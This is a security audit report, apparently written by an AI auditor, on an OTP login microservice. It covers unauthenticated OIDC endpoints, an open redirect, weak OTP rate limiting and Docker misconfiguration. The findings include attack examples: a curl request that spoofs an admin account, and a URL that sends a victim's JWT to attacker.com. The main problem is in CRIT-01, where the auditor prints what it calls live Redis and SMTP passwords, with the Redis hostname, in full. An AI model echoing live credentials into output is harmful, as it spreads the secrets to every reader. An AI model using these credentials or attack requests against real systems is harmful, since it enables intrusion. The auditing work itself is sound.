# TextBeeOTP — Comprehensive Security Audit Report

**Audit Date:** 2026-07-01
**Auditor:** Senior Application Security Engineer (AI)
**Scope:** Full source audit — routes, middleware, services, repositories, views, config, Docker, dependencies
**Codebase:** `/home/pc3/TextBeeOTP` (branch `dev`, commit `089778e`)

---

## Table of Contents

1. [Critical Findings](#critical-findings)
2. [High Severity Findings](#high-severity-findings)
3. [Medium Severity Findings](#medium-severity-findings)
4. [Low Severity Findings](#low-severity-findings)
5. [Executive Summary](#executive-summary)
6. [Prioritized Remediation Roadmap](#prioritized-remediation-roadmap)
7. [Remaining Attack Surface](#remaining-attack-surface)
8. [Overall Security Posture](#overall-security-posture)

---

## Critical Findings

---

### CRIT-01 — Live Production Secrets Stored in Plaintext `.env` File

| Attribute         | Value                                                |
| ----------------- | ---------------------------------------------------- |
| **Severity**      | Critical                                             |
| **CWE**           | CWE-312 (Cleartext Storage of Sensitive Information) |
| **Affected File** | `.env` (lines 11, 22, 44, 58, 63)                    |

**Root Cause**

The `.env` file on disk holds live, rotating production secrets:

- `OTP_SECRET` — HMAC key used to hash all stored OTPs
- `API_KEYS` — key that gates all API access
- `REDIS_URL` — full Redis Cloud URL **with embedded password** (`OP7DMzZwYLgPALF2l70vAJfF2CKCG5h3`) pointing to a live instance at `redis-16252.c321.us-east-1-2.ec2.cloud.redislabs.com:16252`
- `SMTP_PASS` — live Zoho SMTP app password (`S8Gn1tUQvzpH`)
- `AUTH_TOKEN_SECRET` — secret used to sign all JWTs

The `.env` is correctly listed in `.gitignore` and was confirmed **not** committed to the repository (`git show ec68eee:.env` returns `NOT IN GIT`). However, the secrets are real and live. Their presence in a plaintext file creates severe risks if any process on the host (malicious npm package, CI runner, another app) can read the filesystem.

**Exploitation Scenario**

An attacker with filesystem read access (via a malicious package, CI leak, or another app) can:

1. Authenticate to the live Redis Cloud instance and read/delete all active OTP records and rate-limit counters
2. Forge arbitrary JWTs using `AUTH_TOKEN_SECRET`
3. Compute valid OTP HMAC hashes offline using `OTP_SECRET`
4. Send phishing emails via the live Zoho SMTP relay
5. Call all protected API endpoints using the raw `API_KEYS` value

**Impact:** Complete compromise of all security controls.

**Remediation**

```bash
# Step 1: Rotate ALL of the following immediately:
#   OTP_SECRET, API_KEYS, REDIS_URL password, SMTP_PASS, AUTH_TOKEN_SECRET

# Step 2: Move to a secrets manager for all non-local environments
#   Options: AWS Secrets Manager, HashiCorp Vault, Doppler, Docker secrets

# Step 3: In docker-compose, source secrets from the host environment, not .env
services:
  app:
    environment:
      OTP_SECRET: ${OTP_SECRET}   # sourced from host env, never from a mounted file
```

> [!CAUTION]
> **Rotate every value in `.env` immediately.** The Redis password, SMTP password, and all signing secrets must be considered fully compromised regardless of whether this repo was pushed publicly.

---

### CRIT-02 — Unauthenticated OIDC Account Creation Endpoint

| Attribute         | Value                                                  |
| ----------------- | ------------------------------------------------------ |
| **Severity**      | Critical                                               |
| **CWE**           | CWE-306 (Missing Authentication for Critical Function) |
| **Affected File** | `src/oidc/provider.ts` (lines 141–163)                 |

**Root Cause**

The `POST /oauth2/account` endpoint creates an in-memory OIDC account with a caller-supplied `email`, `name`, `picture`, and `provider` field. It has **zero authentication**. It is mounted directly on `apiApp` inside an `async IIFE` (server.ts lines 127–142), which means Express registers the route **after** the `createApiKeyAuth` middleware in the middleware chain — bypassing auth entirely due to Express's async route registration timing.

```typescript
// src/oidc/provider.ts — lines 141-163
app.post('/oauth2/account', (req, res) => {
  const { sub, email, email_verified, name, picture, provider: authProvider } = req.body;
  if (!sub) {
    return res.status(400).json({ error: 'Missing sub ...' });
  }
  const accountId = `${authProvider}_${uuidv4()}`;
  const account: ExternalAccount = { accountId, sub, email, ... };
  externalAccounts.set(accountId, account);   // no auth check whatsoever
  res.json({ accountId, sub: accountId });
});
```

**Exploitation Scenario**

```bash
curl -X POST https://target/oauth2/account \
  -H 'Content-Type: application/json' \
  -d '{"sub":"admin","email":"admin@victim.com","email_verified":true,"provider":"google"}'
# Returns: {"accountId":"google_<uuid>","sub":"google_<uuid>"}
# Attacker uses the accountId to complete an OIDC authorization_code flow
# and obtain a valid id_token with email=admin@victim.com
```

**Impact:** Full identity spoofing — any user account can be impersonated.

**Remediation**

```typescript
// Apply API key auth to the account creation route
app.post('/oauth2/account',
  createApiKeyAuth({ keys: securityConfig.apiKeys, healthKeys: [], logger }),
  (req, res) => { ... }
);
```

Additionally, restrict this endpoint to the internal network and never expose it publicly.

---

### CRIT-03 — Unauthenticated OIDC Account Retrieval (PII Exposure)

| Attribute         | Value                                       |
| ----------------- | ------------------------------------------- |
| **Severity**      | Critical                                    |
| **CWE**           | CWE-200 (Exposure of Sensitive Information) |
| **Affected File** | `src/oidc/provider.ts` (lines 166–175)      |

**Root Cause**

`GET /oauth2/account/:accountId` returns the full account object — email, name, picture, `email_verified`, and provider — without any authentication.

```typescript
app.get('/oauth2/account/:accountId', (req, res) => {
  const { accountId } = req.params;
  const account = externalAccounts.get(accountId);
  if (!account) return res.status(404).json({ error: 'Account not found' });
  res.json(account); // leaks PII, no auth
});
```

**Impact:** PII exposure (email, name, profile picture) for all authenticated users.

**Remediation**

Remove this endpoint entirely. It is labeled "for testing" and must not exist in production. If internal introspection is needed, gate it behind an API key and restrict to localhost only.

---

## High Severity Findings

---

### HIGH-01 — Open Redirect via Unvalidated `returnUrl` Parameter

| Attribute          | Value                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------- |
| **Severity**       | High                                                                                                              |
| **CWE**            | CWE-601 (URL Redirection to Untrusted Site)                                                                       |
| **Affected Files** | `src/routes/ui.ts` (lines 60–61, 115–118), `src/views/login.js` (line 132), `src/views/verify.js` (lines 110–129) |

**Root Cause**

The `?return=` query parameter is accepted by `/login` and `/verify` and injected into the page without any domain validation. The client-side `verify.js` then POSTs the JWT to whatever URL is in `returnUrl`, including attacker-controlled origins.

Server-side (`ui.ts` line 61):

```typescript
const returnUrl = req.query.return as string;
injections += `<script${nonce}>window.RETURN_URL = ${JSON.stringify(returnUrl || '')};</script>`;
// No validation that returnUrl belongs to an allowed origin
```

Client-side (`verify.js` lines 110–115):

```javascript
if (returnUrl) {
  const f = document.createElement('form');
  f.method = 'POST';
  f.action = returnUrl; // attacker-controlled POST destination
  addField('token', data.token);
  addField('email', data.email || recipient);
  f.submit();
}
```

**Exploitation Scenario**

```
https://target/login?return=https://attacker.com/steal
```

1. Victim clicks a phishing link to the legitimate OTP login page
2. They complete OTP verification normally
3. Browser silently POSTs their JWT token + email to `attacker.com`
4. Attacker uses the captured JWT against `/api/auth/validate` to authenticate as the victim

**Impact:** Token theft, account takeover, phishing amplification.

**Remediation**

```typescript
// src/routes/ui.ts — validate returnUrl against allowedOrigins
function validateReturnUrl(rawUrl: string, allowedOrigins: string[]): string | null {
  try {
    const parsed = new URL(rawUrl);
    if (!allowedOrigins.includes(parsed.origin)) return null;
    return rawUrl;
  } catch {
    return null;
  }
}

// In /login and /verify handlers:
const rawReturn = req.query.return as string | undefined;
const returnUrl = rawReturn ? validateReturnUrl(rawReturn, securityConfig.allowedOrigins) : null;
injections += `<script${nonce}>window.RETURN_URL = ${JSON.stringify(returnUrl || '')};</script>`;
```

---

### HIGH-02 — JWT Generated Before OTP Verification Succeeds (Logic Flaw)

| Attribute         | Value                              |
| ----------------- | ---------------------------------- |
| **Severity**      | High                               |
| **CWE**           | CWE-840 (Business Logic Errors)    |
| **Affected File** | `src/routes/ui.ts` (lines 168–173) |

**Root Cause**

In `/ui/otp/verify`, a JWT is signed **before** the OTP is verified:

```typescript
// Generate the token BEFORE consuming the OTP...
const token = generateAuthToken(recipient); // token already signed

const ok = await otpService.verifyOTP(recipient, code);
if (!ok) return res.status(400).json({ error: 'invalid_code' });

return res.status(200).json({ status: 'verified', email: recipient, token });
```

The code comment justifies this by saying a token-generation failure should not consume the OTP. However, `generateAuthToken` only fails if `AUTH_TOKEN_SECRET` is missing — a startup condition that must be caught at boot, not at runtime. In the current code the token is never returned on the `!ok` branch, so it is not directly exploitable. However, the logic is one refactor away from a critical authentication bypass (e.g., if `token` is accidentally included in the error response, or logged).

**Impact:** Direct authentication bypass if token is ever returned or logged in the `!ok` path.

**Remediation**

```typescript
// Always verify first, generate token only on success
const ok = await otpService.verifyOTP(recipient, code);
if (!ok) return res.status(400).json({ error: 'invalid_code' });

const token = generateAuthToken(recipient); // generated only after verification
return res.status(200).json({ status: 'verified', email: recipient, token });
```

---

### HIGH-03 — Verify Rate Limit is Per-IP Only (OTP Brute-Force via Distributed Attack)

| Attribute          | Value                                                                                                             |
| ------------------ | ----------------------------------------------------------------------------------------------------------------- |
| **Severity**       | High                                                                                                              |
| **CWE**            | CWE-307 (Improper Restriction of Excessive Authentication Attempts)                                               |
| **Affected Files** | `src/routes/otp.ts` (lines 27–32), `src/routes/ui.ts` (lines 136–141), `src/services/otpService.ts` (lines 60–70) |

**Root Cause**

`express-rate-limit` limits by IP address (`VERIFY_RATE_LIMIT_MAX=10` per window). An attacker with multiple IPs can make 10 attempts per IP. The `verifyOTP` service has **no per-recipient failed-attempt counter** and does not invalidate the OTP after N wrong guesses:

```typescript
async verifyOTP(recipient: string, code: string): Promise<boolean> {
  const normalizedRecipient = normalizeRecipient(recipient);
  const record = await this.repo.get(normalizedRecipient);
  if (!record || record.isExpired() || !timingSafeOtpEqual(...)) {
    return false;   // no failed-attempt counter, OTP survives indefinitely
  }
  await this.repo.delete(normalizedRecipient);
  ...
}
```

**Exploitation Scenario**

With 10 IPs, 10 guesses/IP/minute, over a 10-minute OTP TTL: 1,000 guesses = 0.1% success rate per target. Scaled to 100 IPs: 10,000 guesses, practically exhausting a 6-digit OTP space.

**Impact:** OTP brute-force, authentication bypass.

**Remediation**

Add per-recipient failed-attempt tracking and burn the OTP after a threshold:

```typescript
// src/services/otpService.ts
const MAX_VERIFY_ATTEMPTS = 5;

async verifyOTP(recipient: string, code: string): Promise<boolean> {
  const normalizedRecipient = normalizeRecipient(recipient);
  const record = await this.repo.get(normalizedRecipient);
  if (!record || record.isExpired()) return false;

  const failures = await this.repo.incrementVerifyAttempts(normalizedRecipient, this.ttlSeconds);
  if (failures > MAX_VERIFY_ATTEMPTS) {
    await this.repo.delete(normalizedRecipient); // burn OTP after too many failures
    throw Object.assign(new Error('too_many_attempts'), { code: 'RATE_LIMITED' });
  }

  if (!timingSafeOtpEqual(record.code, normalizedRecipient, code)) {
    return false;
  }

  await this.repo.delete(normalizedRecipient);
  await this.repo.resetVerifyAttempts(normalizedRecipient);
  await this.repo.resetSendAttempts(normalizedRecipient);
  return true;
}
```

Add `incrementVerifyAttempts` / `resetVerifyAttempts` to `IOtpRepository` and both implementations.

---

### HIGH-04 — Vulnerable Dependency: `nodemailer` SSRF / Arbitrary File Read

| Attribute         | Value                                                     |
| ----------------- | --------------------------------------------------------- |
| **Severity**      | High                                                      |
| **CWE**           | CWE-918 (Server-Side Request Forgery)                     |
| **Affected File** | `package.json` (line 56), `src/providers/emailAdapter.ts` |

**Root Cause**

`npm audit` confirms `nodemailer ^8.0.10` has a high-severity advisory:

> **"Nodemailer: Message-level raw option bypasses disableFileAccess/disableUrlAccess, enabling arbitrary file read and full-response SSRF in the delivered message"** (GHSA — High)

The `message` content passed to `sendMail` is internally constructed in the current code and not directly attacker-controlled. However, the vulnerable library is present and the attack surface exists if message construction ever incorporates external data.

**Remediation**

```bash
npm audit fix
# or: npm install nodemailer@latest
```

---

### HIGH-05 — Vulnerable Dependency: `form-data` CRLF Injection

| Attribute         | Value                                   |
| ----------------- | --------------------------------------- |
| **Severity**      | High                                    |
| **CWE**           | CWE-93 (CRLF Injection)                 |
| **Affected File** | `package.json` (transitive via `axios`) |

**Root Cause**

`form-data` versions `4.0.0–4.0.5` (present in `node_modules/form-data`) allow CRLF injection through unescaped multipart field names and filenames. `axios` depends on this library.

**Remediation**

```bash
npm audit fix --force
# Verify: npm ls form-data  — should show >= 4.0.6
```

---

## Medium Severity Findings

---

### MED-01 — CSP Nonce Architecture is Fragile (Shared `pagesRouter` + Dual Apps)

| Attribute         | Value                                         |
| ----------------- | --------------------------------------------- |
| **Severity**      | Medium                                        |
| **CWE**           | CWE-330 (Use of Insufficiently Random Values) |
| **Affected File** | `src/server.ts` (lines 26–39, 110–123)        |

**Root Cause**

The `helmetWithNonce()` factory is called separately for `apiApp` (line 47) and `uiApp` (line 112). Both apply independent CSP headers with independent nonces to the same shared `pagesRouter`. When `uiApp` serves `/login`, it generates a nonce for the CSP header. If `apiApp` also processed the same request (e.g., same-port mode where `uiApp === apiApp`), the nonce is generated once — fine. But in separate-port mode, `uiApp` has its own helmet instance generating its own nonce, while `apiApp`'s helmet never fires for that request. The nonce in the HTML template is read from `res.locals.cspNonce` at render time, which is correctly per-request. The current behavior is safe but architecturally fragile — any reordering of middleware array elements could cause the nonce in the HTTP header to differ from the nonce injected into the HTML, silently breaking CSP enforcement.

**Remediation**

Use a dedicated nonce middleware library (`csp-nonce`, `helmet-csp-nonce`) that keeps nonce generation, CSP header injection, and HTML injection tightly coupled. Add an integration test that verifies the nonce in the `script-src` directive matches the `nonce=` attribute in the served HTML.

---

### MED-02 — Cached HTML Could Inadvertently Preserve Injected Nonces

| Attribute         | Value                                         |
| ----------------- | --------------------------------------------- |
| **Severity**      | Medium                                        |
| **CWE**           | CWE-330 (Use of Insufficiently Random Values) |
| **Affected File** | `src/routes/ui.ts` (lines 40–71, 73–122)      |

**Root Cause**

`cachedLoginHtml` and `cachedVerifyHtml` store the **raw** HTML before injection. Injections (including the nonce) are appended per-request, which is correct. However, if a future developer "optimizes" by caching the injected HTML (a natural mistake), all requests would share one static nonce — making the CSP protection completely ineffective.

**Remediation**

Add a prominent warning comment:

```typescript
// WARNING: NEVER cache html after nonce injection. The nonce must be unique per request.
// Only the raw template (before injection) may be cached.
let cachedLoginHtml: string | null = null;
```

Consider switching to a templating engine (`eta`, `nunjucks`) where per-request rendering is the default and caching requires explicit opt-in.

---

### MED-03 — JWT Token Exposed in Plaintext in Browser DOM

| Attribute         | Value                                                                |
| ----------------- | -------------------------------------------------------------------- |
| **Severity**      | Medium                                                               |
| **CWE**           | CWE-312 (Cleartext Storage of Sensitive Information)                 |
| **Affected File** | `src/views/verify.js` (line 131), `src/views/verify.html` (line 292) |

**Root Cause**

When no `returnUrl` is set, the JWT is rendered directly into a visible DOM element:

```javascript
// verify.js line 131
tokenDisplay.textContent = `Token: ${data.token}`;
```

`.textContent` is XSS-safe, but the token (a bearer credential) is visible to:

- Browser extensions reading DOM content
- Screen-sharing / screenshots
- `window.find()` clipboard attacks

**Remediation**

- In production (`NODE_ENV=production`), do not display the token in the UI at all
- If display is required for development/testing, offer a "Copy to Clipboard" button and auto-clear after 30 seconds
- Never log the token server-side (currently complied with)

---

### MED-04 — Recipient (PII) Logged Directly in Error Paths

| Attribute          | Value                                                                   |
| ------------------ | ----------------------------------------------------------------------- |
| **Severity**       | Medium                                                                  |
| **CWE**            | CWE-532 (Insertion of Sensitive Information into Log File)              |
| **Affected Files** | `src/routes/otp.ts` (lines 46, 73), `src/routes/ui.ts` (lines 153, 181) |

**Root Cause**

Email addresses and phone numbers are logged in error paths:

```typescript
// src/routes/otp.ts line 46
req.log.error({ err, recipient, channel }, 'Error sending OTP');

// src/routes/otp.ts line 73
req.log.error({ err, recipient }, 'Error verifying OTP');
```

These appear in any log aggregator (CloudWatch, Datadog) where they may be retained long-term and subject to broader access controls than the application itself.

**Remediation**

```typescript
function maskRecipient(r: string): string {
  return r.includes('@') ? r.replace(/^(.{2}).*@/, '$1***@') : r.replace(/.(?=.{4})/g, '*');
}
req.log.error({ err, recipient: maskRecipient(recipient), channel }, 'Error sending OTP');
```

---

### MED-05 — Redis URL Password Masking Regex Can Fail on Edge-Case URLs

| Attribute         | Value                                                |
| ----------------- | ---------------------------------------------------- |
| **Severity**      | Medium                                               |
| **CWE**           | CWE-312 (Cleartext Storage of Sensitive Information) |
| **Affected File** | `src/bootstrap.ts` (line 24)                         |

**Root Cause**

```typescript
config.redisUrl.replace(/:[^:@]+@/, ':****@');
```

The regex `[^:@]+` requires one or more characters. For a URL like `redis://:password@host` (empty username), the segment before `@` is `:password` which matches fine. But for `redis://password@host` (no protocol user separator at all), the regex may not match, leaking the password. The `URL` constructor is a more robust alternative.

**Remediation**

```typescript
function maskRedisUrl(url: string): string {
  try {
    const parsed = new URL(url);
    if (parsed.password) parsed.password = '****';
    return parsed.toString();
  } catch {
    return '[invalid redis url]';
  }
}
logger.info({ redisUrl: maskRedisUrl(config.redisUrl) }, 'Using Redis OTP repository');
```

---

### MED-06 — OIDC Client Secret Falls Back to Per-Restart UUID in Production

| Attribute         | Value                                                               |
| ----------------- | ------------------------------------------------------------------- |
| **Severity**      | Medium                                                              |
| **CWE**           | CWE-330 (Use of Insufficiently Random Values — lack of persistence) |
| **Affected File** | `src/oidc/provider.ts` (line 41)                                    |

**Root Cause**

```typescript
const clientSecret = config.oidcClientSecret || uuidv4();
```

If `OIDC_CLIENT_SECRET` is absent, a new random UUID is generated on every server restart, invalidating all existing oauth2-proxy sessions.

**Remediation**

```typescript
if (config.enableOidc && config.isProduction && !config.oidcClientSecret) {
  throw new Error('OIDC_CLIENT_SECRET is required in production when OIDC is enabled');
}
const clientSecret = config.oidcClientSecret || uuidv4();
```

---

### MED-07 — Verify Rate Limit Default Too Permissive (10 guesses/window/IP)

| Attribute         | Value                                                               |
| ----------------- | ------------------------------------------------------------------- |
| **Severity**      | Medium                                                              |
| **CWE**           | CWE-307 (Improper Restriction of Excessive Authentication Attempts) |
| **Affected File** | `src/utils/config.ts` (line 68)                                     |

**Root Cause**

`VERIFY_RATE_LIMIT_MAX` defaults to 10. Combined with the absence of per-recipient lockout (HIGH-03), this allows 10 guesses per IP per minute — far too many for a 6-digit OTP.

**Remediation**

Reduce the default to 3–5 and document it in `.env.example` as a security-critical parameter.

---

### MED-08 — Docker Redis Exposed on All Interfaces Without a Password

| Attribute         | Value                                          |
| ----------------- | ---------------------------------------------- |
| **Severity**      | Medium                                         |
| **CWE**           | CWE-668 (Exposure of Resource to Wrong Sphere) |
| **Affected File** | `docker-compose.yml` (lines 8, 12)             |

**Root Cause**

```yaml
command: redis-server --appendonly yes # no requirepass
ports:
  - '6379:6379' # binds 0.0.0.0
```

Redis is bound to all interfaces with no password. Any host reachable over the network with a gap in the firewall can access it unauthenticated.

**Remediation**

```yaml
command: redis-server --appendonly yes --requirepass ${REDIS_PASSWORD}
ports:
  - '127.0.0.1:6379:6379'
```

---

### MED-09 — Docker Compose Mounts Entire Workspace (Including `.env`) into Container

| Attribute         | Value                                                           |
| ----------------- | --------------------------------------------------------------- |
| **Severity**      | Medium                                                          |
| **CWE**           | CWE-732 (Incorrect Permission Assignment for Critical Resource) |
| **Affected File** | `docker-compose.yml` (line 31)                                  |

**Root Cause**

```yaml
volumes:
  - .:/workspace:cached
```

The entire project root (including `.env` and `certs/`) is bind-mounted. Any process inside the container can read live secrets directly from the filesystem.

**Remediation**

```yaml
volumes:
  - ./src:/workspace/src:ro
  - ./package.json:/workspace/package.json:ro
  # Never mount the project root
```

Pass secrets via `environment:` or Docker secrets, not mounted files.

---

## Low Severity Findings

---

### LOW-01 — OTP HMAC Secret Defaults to a Known Static String in Development

| Attribute         | Value                                   |
| ----------------- | --------------------------------------- |
| **Severity**      | Low                                     |
| **CWE**           | CWE-798 (Use of Hard-coded Credentials) |
| **Affected File** | `src/utils/config.ts` (lines 22–31)     |

**Root Cause**

```typescript
return 'local-development-secret-change-me';
```

If `OTP_SECRET` is unset in dev/test, a well-known static string is used as the HMAC key. Anyone who reads the source can forge OTP hashes stored with this key.

**Remediation**

```typescript
import crypto from 'crypto';
const ephemeral = crypto.randomBytes(32).toString('hex');
logger.warn('OTP_SECRET not set — using ephemeral secret, all OTPs invalidated on restart');
return ephemeral;
```

---

### LOW-02 — `AUTH_TOKEN_SECRET` Validation Deferred to First Request Instead of Startup

| Attribute         | Value                                                                            |
| ----------------- | -------------------------------------------------------------------------------- |
| **Severity**      | Low                                                                              |
| **CWE**           | CWE-778 (Insufficient Logging) / CWE-754 (Improper Check for Unusual Conditions) |
| **Affected File** | `src/utils/config.ts` (line 142), `src/utils/jwt.ts` (lines 12–15)               |

**Root Cause**

If `AUTH_TOKEN_SECRET` is absent, the error is thrown at the first call to `generateAuthToken`, not at startup. The server appears healthy but the verify endpoint always returns 500.

**Remediation**

Add an explicit startup check in `bootstrap.ts`:

```typescript
if (!config.authTokenSecret) {
  if (config.isProduction) {
    logger.fatal('AUTH_TOKEN_SECRET required');
    process.exit(1);
  }
  logger.warn('AUTH_TOKEN_SECRET not set — /ui/otp/verify will always fail');
}
```

---

### LOW-03 — CORS Wildcard Active When `ALLOWED_ORIGINS` Unset in Non-Production

| Attribute          | Value                                                                                     |
| ------------------ | ----------------------------------------------------------------------------------------- |
| **Severity**       | Low                                                                                       |
| **CWE**            | CWE-942 (Permissive Cross-domain Policy)                                                  |
| **Affected Files** | `src/utils/securityConfig.ts` (lines 57–63), `src/middleware/corsPolicy.ts` (lines 15–27) |

**Root Cause**

In non-production mode with no `ALLOWED_ORIGINS`, the CORS middleware returns `Access-Control-Allow-Origin: *`. If a staging environment is accidentally deployed without `ALLOWED_ORIGINS` and with `NODE_ENV != production`, all origins are permitted.

**Remediation**

Add a CI deployment gate that validates required security env vars are present for any environment that serves real traffic.

---

### LOW-04 — Health Endpoints Expose Internal Infrastructure Details Unauthenticated

| Attribute          | Value                                                            |
| ------------------ | ---------------------------------------------------------------- |
| **Severity**       | Low                                                              |
| **CWE**            | CWE-200 (Exposure of Sensitive Information)                      |
| **Affected Files** | `src/server.ts` (lines 58–69), `src/routes/otp.ts` (lines 82–99) |

**Root Cause**

`/health` and `/otp/health` are intentionally unauthenticated. They reveal: environment name, OIDC status, storage backend (redis vs in-memory), Redis connectivity, provider configuration. This information aids attacker reconnaissance.

**Remediation**

Return only `{"status":"ok"}` to unauthenticated callers. Return the full status only to requests bearing a valid `HEALTH_API_KEY`.

---

### LOW-05 — Client-Side OTP Timer Hardcoded to 600s, Does Not Reflect Server TTL

| Attribute         | Value                           |
| ----------------- | ------------------------------- |
| **Severity**      | Low                             |
| **CWE**           | CWE-840 (Business Logic Errors) |
| **Affected File** | `src/views/verify.js` (line 47) |

**Root Cause**

```javascript
let secondsLeft = 600; // hardcoded, does not reflect OTP_TTL_SECONDS
```

If `OTP_TTL_SECONDS` is changed, the UI timer shows incorrect expiry information.

**Remediation**

```typescript
// ui.ts /verify handler
injections += `<script${nonce}>window.OTP_TTL_SECONDS = ${config.otpTtlSeconds};</script>`;
```

```javascript
// verify.js
let secondsLeft = window.OTP_TTL_SECONDS || 600;
```

---

### LOW-06 — Docker Production Stage Runs as Root

| Attribute         | Value                                           |
| ----------------- | ----------------------------------------------- |
| **Severity**      | Low                                             |
| **CWE**           | CWE-250 (Execution with Unnecessary Privileges) |
| **Affected File** | `Dockerfile`                                    |

**Root Cause**

The production stage does not set a non-root user. If the Node process is compromised, the attacker has root inside the container.

**Remediation**

```dockerfile
FROM base AS production
ENV NODE_ENV=production
COPY package*.json ./
RUN npm install --omit=dev
COPY --from=builder /workspace/dist ./dist
RUN addgroup -S appgroup && adduser -S appuser -G appgroup
USER appuser
EXPOSE 3008
CMD ["npm", "start"]
```

---

### LOW-07 — CORS Middleware Missing `Vary: Origin` Header

| Attribute         | Value                             |
| ----------------- | --------------------------------- |
| **Severity**      | Low                               |
| **CWE**           | CWE-346 (Origin Validation Error) |
| **Affected File** | `src/middleware/corsPolicy.ts`    |

**Root Cause**

When `Access-Control-Allow-Origin` is conditionally set based on the `Origin` request header, `Vary: Origin` must also be set. Without it, caching proxies may serve a cached response with one origin's ACAO header to requests from a different origin.

**Remediation**

```typescript
if (originMatched) {
  res.setHeader('Access-Control-Allow-Origin', origin!);
  res.setHeader('Vary', 'Origin');
}
```

---

### LOW-08 — `app-config.json` and `.catalystrc` Not in `.dockerignore`

| Attribute         | Value                                             |
| ----------------- | ------------------------------------------------- |
| **Severity**      | Low                                               |
| **CWE**           | CWE-538 (File and Directory Information Exposure) |
| **Affected File** | `.dockerignore`, `app-config.json`, `.catalystrc` |

**Root Cause**

The builder stage uses `COPY . .` which copies `app-config.json` (Zoho Catalyst metadata) and `.catalystrc` into the Docker image, even though both are in `.gitignore`.

**Remediation**

Add to `.dockerignore`:

```
app-config.json
.catalystrc
.env
.env.*
certs/
```

---

## Executive Summary

TextBeeOTP is a well-structured OTP authentication microservice. The development team has made several sound security decisions: HMAC-SHA256 OTP hashing with per-recipient salting, timing-safe comparisons throughout, Zod schema validation on all inputs, Helmet CSP with per-request nonces, and production-enforced secrets validation.

**However, three Critical and five High severity findings require immediate action:**

| Severity    | Count | Key Issues                                                                                                             |
| ----------- | ----- | ---------------------------------------------------------------------------------------------------------------------- |
| 🔴 Critical | 3     | Live secrets on disk, unauthenticated OIDC account creation, unauthenticated PII retrieval                             |
| 🟠 High     | 5     | Open redirect via `?return=`, JWT generated before verification, no per-recipient OTP lockout, 2 high CVE dependencies |
| 🟡 Medium   | 9     | CSP nonce fragility, Docker Redis exposure, PII in logs, SSRF in nodemailer                                            |
| 🟢 Low      | 8     | Root Docker user, missing Vary header, health info disclosure, timer mismatch                                          |

The single most urgent finding is **CRIT-01**: live SMTP credentials, Redis credentials (pointing to a live cloud instance), and signing secrets exist in plaintext in `.env`. **These must be rotated immediately, before any other work.**

---

## Prioritized Remediation Roadmap

### Phase 1 — Immediate (within 24 hours)

| #   | Action                                                                                                       | Finding |
| --- | ------------------------------------------------------------------------------------------------------------ | ------- |
| 1   | **Rotate all secrets** in `.env`: `OTP_SECRET`, `API_KEYS`, Redis password, `SMTP_PASS`, `AUTH_TOKEN_SECRET` | CRIT-01 |
| 2   | **Add API key auth** to `POST /oauth2/account`                                                               | CRIT-02 |
| 3   | **Remove** `GET /oauth2/account/:accountId` entirely                                                         | CRIT-03 |
| 4   | **Validate `returnUrl`** against `allowedOrigins` before injecting into page                                 | HIGH-01 |
| 5   | **Move `generateAuthToken`** to after `verifyOTP` succeeds                                                   | HIGH-02 |

### Phase 2 — Short-term (within 1 week)

| #   | Action                                                                      | Finding          |
| --- | --------------------------------------------------------------------------- | ---------------- |
| 6   | Add per-recipient failed-attempt counter and OTP burn after 5 wrong guesses | HIGH-03          |
| 7   | `npm audit fix` — patch `nodemailer` and `form-data`                        | HIGH-04, HIGH-05 |
| 8   | Bind Docker Redis to `127.0.0.1` and add `requirepass`                      | MED-08           |
| 9   | Remove full workspace volume mount in `docker-compose.yml`                  | MED-09           |
| 10  | Mask `recipient` in all error log statements                                | MED-04           |
| 11  | Add `Vary: Origin` to CORS middleware                                       | LOW-07           |
| 12  | Add non-root `USER` to Dockerfile production stage                          | LOW-06           |

### Phase 3 — Medium-term (within 1 month)

| #   | Action                                                          | Finding |
| --- | --------------------------------------------------------------- | ------- |
| 13  | Require `OIDC_CLIENT_SECRET` in production when OIDC is enabled | MED-06  |
| 14  | Use `URL` constructor for Redis URL masking in logger           | MED-05  |
| 15  | Add `OTP_TTL_SECONDS` injection into verify page                | LOW-05  |
| 16  | Gate `/health` and `/otp/health` behind `HEALTH_API_KEY`        | LOW-04  |
| 17  | Reduce `VERIFY_RATE_LIMIT_MAX` default to 3–5                   | MED-07  |
| 18  | Add `app-config.json`, `.catalystrc`, `.env` to `.dockerignore` | LOW-08  |
| 19  | Replace static OTP dev secret with per-boot random secret       | LOW-01  |
| 20  | Add startup validation for `AUTH_TOKEN_SECRET`                  | LOW-02  |

---

## Remaining Attack Surface

After all remediations are applied, the following attack surface remains:

| Surface                                       | Notes                                                                                                                                                                                                                    |
| --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| **SMTP delivery timing oracle**               | OTP delivery latency varies by recipient domain. An attacker running a mail server can measure delivery time to confirm whether an OTP was sent to a given address.                                                      |
| **OTP enumeration via response timing**       | `normalizeRecipient` is called before `repo.get`. If normalization takes measurably longer for certain formats, timing differences may reveal format validity. The HMAC comparison is timing-safe; normalization is not. |
| **Redis key enumeration**                     | Redis keys are `otp:record:<normalized_recipient>`. An attacker with Redis access (e.g., via a misconfigured firewall) can enumerate all active OTPs. Mitigate with Redis AUTH + TLS (`rediss://`).                      |
| **OIDC in-memory account store is unbounded** | `externalAccounts` is an unbounded `Map`. Even after auth is added to account creation, a high volume of authenticated requests could exhaust server memory. Add a max-size cap and per-account TTL.                     |
| **JWT is not revocable**                      | Issued JWTs are valid until expiry (default 300s). There is no revocation mechanism. A stolen token remains valid for up to 5 minutes. This is a known limitation of stateless JWTs; accept and document it.             |
| **OTP channel oracle**                        | `/otp/send` returns different error codes for an invalid `channel` vs. invalid `recipient`. This is informational disclosure, acceptable given the structured error design.                                              |

---

## Overall Security Posture

**Rating: 5.5 / 10 (Pre-remediation) → Projected 8.5 / 10 (Post-remediation)**

| Domain                     | Current                                  | Post-Remediation                    |
| -------------------------- | ---------------------------------------- | ----------------------------------- |
| OTP Cryptography           | ✅ Strong (HMAC-SHA256, timing-safe)     | ✅                                  |
| Input Validation           | ✅ Strong (Zod, recipient normalization) | ✅                                  |
| API Key Authentication     | ✅ Good (timing-safe compare)            | ✅                                  |
| Secrets Management         | ❌ Critical (live secrets in .env)       | ✅ After rotation + secrets manager |
| OIDC Security              | ❌ Critical (unauthenticated endpoints)  | ✅ After CRIT-02/03 fixes           |
| OTP Brute-Force Protection | ⚠️ Partial (IP rate-limit only)          | ✅ After per-recipient lockout      |
| Open Redirect              | ❌ High (unvalidated returnUrl)          | ✅ After origin validation          |
| CSP / Security Headers     | ✅ Good (Helmet + per-request nonce)     | ✅                                  |
